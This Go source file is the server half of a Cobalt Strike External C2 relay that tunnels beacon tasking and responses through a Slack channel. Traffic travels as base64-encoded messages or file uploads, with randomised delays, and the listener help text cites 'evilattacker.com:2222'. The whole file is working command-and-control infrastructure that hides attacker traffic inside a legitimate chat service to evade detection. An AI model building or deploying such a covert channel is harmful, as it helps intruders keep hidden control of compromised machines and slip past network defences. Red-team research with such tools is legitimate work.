package main

import (
	"ExternalC2/pkg/ExternalC2Go"
	"ExternalC2/pkg/SlackBot"
	"bytes"
	"encoding/base64"
	"errors"
	"flag"
	"github.com/google/uuid"
	"github.com/nlopes/slack"
	"log"
	"math/rand"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

var (
	CHANNEL   = ""
	TOKEN     = ""
	ServerBot *SlackBot.SlackBot
	ErrChan = make(chan error)
	IsRunning = false

	GLOBAL_SLEEP_FLOOR = 5
	GLOBAL_SLEEP_CEIL = 10
)

func handleErrorChan() {
	log.Println("[i] Starting error channel thread")

	dummy := errors.New("")
	for {
		if peek := <-ErrChan; strings.Compare(dummy.Error(), peek.Error()) != 0 {
			log.Println(peek)
			dummy = peek
		}
	}
}

func handleIncomingMessages(){
	log.Println("[i] Starting outbound (to CobaltStrike) message dispatch goroutine")

	dummy := ExternalC2Go.EC2Message{}
	dummy.OriginID, _ = uuid.Parse("00000000-0000-0000-0000-000000000000")
	for {
		// poll the outbound channel until we get a message from the C2
		top := <- ExternalC2Go.ServerOutbound
		go SendEC2Message(top)
	}
}

func SendEC2Message(m ExternalC2Go.EC2Message){
	timeSleep := time.Duration((rand.Int() % GLOBAL_SLEEP_CEIL) + GLOBAL_SLEEP_FLOOR) * time.Second
	log.Printf("[i] Sleeping for %d seconds to avoid ratelimit\n", timeSleep)
	time.Sleep(timeSleep)
	// base64 encode the data in the message
	encoded := base64.StdEncoding.EncodeToString(m.Contents)
	if len(encoded) > slack.MaxMessageTextLength {
		log.Println("[i] Response too large, converting to file upload")
		sendFile(encoded, m.OriginID.String())
		return
	}
	sendMessage(encoded, m.OriginID.String())
}

func sendMessage(contents, uid string){
	Text := uid + ":" + contents
	om := ServerBot.RTM.NewOutgoingMessage(Text, CHANNEL)

	log.Printf("[i] Sending message for beacon response: %s\n", uid)

	ServerBot.RTM.SendMessage(om)
}

func sendFile(contents, title string){
	params := new(slack.FileUploadParameters)
	params.Title = title
	params.Content =  contents
	params.Channels = []string{CHANNEL}
	params.Filename = title
	params.Filetype = "auto"

	log.Printf("[i] Uploading file for beacon response: %s\n", title)
	_, err := ServerBot.RTM.UploadFile(*params)
	if err != nil {
		log.Println("[--] Critical, could not upload file for response in sendFile")
		ErrChan <- err
	}
}

func main() {
	go handleErrorChan()
	hostPtr := flag.String("ec2-listener", "0.0.0.0:2222", "The host:port IP of the Cobalt Strike EC2 Listener")
	tokenPtr := flag.String("slack-token", "", "The Slack token of the Server Bot")
	ChannelPtr := flag.String("channel-id", "", "The ID of the channel")

	flag.Parse()

	if *tokenPtr == "" {
		log.Fatal("Need an API token for the bot")
	}
	if *ChannelPtr == "" {
		log.Fatal("Need a channel name for the bot")
	}

	res := strings.Split(*hostPtr, ":")
	if len(res) != 2 {
		log.Fatal("Need the host in the format of HOST:PORT, i.e. 192.168.1.3:2222 or evilattacker.com:2222")
	}

	// try to launch the external C2 handler
	ExternalC2Go.Init(res[0], res[1])

	log.Println("[i] Starting Slack Server")

	Init(*tokenPtr, *ChannelPtr)
	WaitForCtrlC()
}

func WaitForCtrlC() {
	var end_waiter sync.WaitGroup
	end_waiter.Add(1)
	var signal_channel chan os.Signal
	signal_channel = make(chan os.Signal, 1)
	signal.Notify(signal_channel, os.Interrupt)
	go func() {
		<-signal_channel
		end_waiter.Done()
		log.Println("[i] SIGTERM received, cleaning up...")
		ExternalC2Go.Stop()
	}()
	end_waiter.Wait()
}

func Init(token, channel string) {
	CHANNEL = channel
	tmpAPI := slack.New(token)
	tmpRTM := tmpAPI.NewRTM()
	ServerBot = SlackBot.NewSlackBot(*tmpAPI, *tmpRTM)
	log.Println("[i] Sarting RTM manage routine")
	go ServerBot.RTM.ManageConnection()
	go handleIncomingMessages()
	go ListenLoop()
}

func ListenLoop() {
	log.Println("[i] Starting slack message queue")
	for {
		select {
		case msg := <-ServerBot.RTM.IncomingEvents:
			info := ServerBot.RTM.GetInfo()

			log.Printf("[d] Incoming Message Type: %T\n", msg.Data)
			switch ev := msg.Data.(type) {
			case *slack.MessageEvent:
				log.Println("[i] Handling message event in new thread")
				go HandleMessage(ev, info)
			case *slack.FileSharedEvent:
				go HandleFile(ev, info)
			}
		}
	}
}

func SlackMsgToEC2Message(contents string, isFile bool, uid *uuid.UUID) *ExternalC2Go.EC2Message{
	// if it's a message
	if !isFile {
		res := strings.Split(contents, ":")
		if len(res) != 2 {
			log.Println("[-] Malformed input for tasking, ignoring...")
			return nil
		}

		// get the uuid from the beginning of the message
		uid, err := uuid.Parse(res[0])
		if err != nil {
			log.Println("[-] Error converting prefix to UID")
			ErrChan <- err
			return nil
		}

		// decode the message
		rawData := res[1]
		decoded, err := base64.StdEncoding.DecodeString(rawData)

		if err != nil {
			ErrChan <- err
			return nil
		}
		return ExternalC2Go.NewEC2Message([]byte(decoded), uid)
	} else {
		return ExternalC2Go.NewEC2Message([]byte(contents), *uid)
	}
	return nil
}

func HandleMessage(event *slack.MessageEvent, info *slack.Info){
	if isSelfMessageEvent(event, info) {
		log.Println("[i] Ignoring message from self")
		return
	}
	EC2Msg := SlackMsgToEC2Message(event.Text, false, nil)
	if EC2Msg == nil {
		log.Printf("[i] Could not parse message, ignoring (preview): %s\n", event.Text[0:len(event.Text) % 100])
		return
	}
	log.Println("[i] Sending Message to External C2 listener channel")
	ExternalC2Go.ServerInbound <- *EC2Msg
}

func HandleFile(event *slack.FileSharedEvent, info *slack.Info){
	// get the file info
	res,_,_, err := ServerBot.RTM.GetFileInfo(event.FileID, 1,1)

	if err != nil {
		log.Printf("[-] Error getting file information for file (ignoring): %s\n", event.FileID)
		ErrChan <- err
		return
	}

	if isSelfFileEvent(info, res) {
		log.Println("[i] Ignoring message from self")
		return
	}

	// get the uid from the file name
	uid, err := uuid.Parse(res.Title)
	if err != nil {
		log.Println("[-] Error parsing UID from file name")
	}

	// get the data from the file
	var data bytes.Buffer
	err = ServerBot.Client.GetFile(res.URLPrivateDownload, &data)
	if err != nil {
		log.Printf("[-] Error downloading file: %s\n", res.URLPrivateDownload)
		ErrChan <- err
	}

	log.Printf("[i] Got %d bytes from file at url: %s\n", data.Len(), res.URLPrivateDownload)
	// base64 decode it

	decoded := make([]byte, data.Len())
	_, err = base64.StdEncoding.Decode(decoded, data.Bytes())
	if err != nil {
		log.Println("[-] Error decoding base64 file data\n", res.URLPrivateDownload)
		ErrChan <- err
	}
	EC2Msg := SlackMsgToEC2Message(string(decoded), true, &uid)

	if EC2Msg == nil {
		log.Println("[--] Critical: Could not convert Slack Message to External C2 Message (ignoring file!)")
		return
	}
	log.Println("[i] Sending Message to External C2 listener channel")
	ExternalC2Go.ServerInbound <- *EC2Msg
}

func isSelfFileEvent(info *slack.Info, res *slack.File) bool {
	return strings.Compare(res.User, info.User.ID) == 0
}

func isSelfMessageEvent(event *slack.MessageEvent, info *slack.Info) bool {
	return strings.Compare(event.User, info.User.ID) == 0
}
